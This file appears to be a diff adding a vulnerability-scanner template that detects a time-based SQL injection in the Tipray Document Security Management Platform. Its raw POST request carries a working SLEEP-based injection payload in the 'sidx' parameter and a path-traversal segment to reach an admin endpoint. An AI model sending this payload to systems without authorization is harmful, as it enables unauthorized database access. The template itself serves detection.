@@ -1,0 +1,39 @@
+id: tipray-dsmp-findconfigforpage-sqli
+info:
+  name: Tipray Document Security Management Platform SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    The Tipray Document Security Management Platform is vulnerable to a time-based SQL injection vulnerability in the `findConfigForPage.do` endpoint. Exploitation of this vulnerability can lead to arbitrary SQL query execution.
+
+variables:
+  t1: "{{rand_int(5, 10)}}"
+  t2: "{{to_number(t1) + 2}}"
+
+http:
+  - raw:
+      - |
+        POST /lddsm/service/../admin/config/findConfigForPage.do HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        page=1&rows=10&sidx=(SELECT * FROM (SELECT(SLEEP({{t1}})))x)
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '"page":'
+          - '"key":'
+      - type: word
+        part: header
+        words:
+          - "application/json"
+      - type: dsl
+        dsl:
+          - "duration > to_number(t1)"
+          - "duration < to_number(t2)"
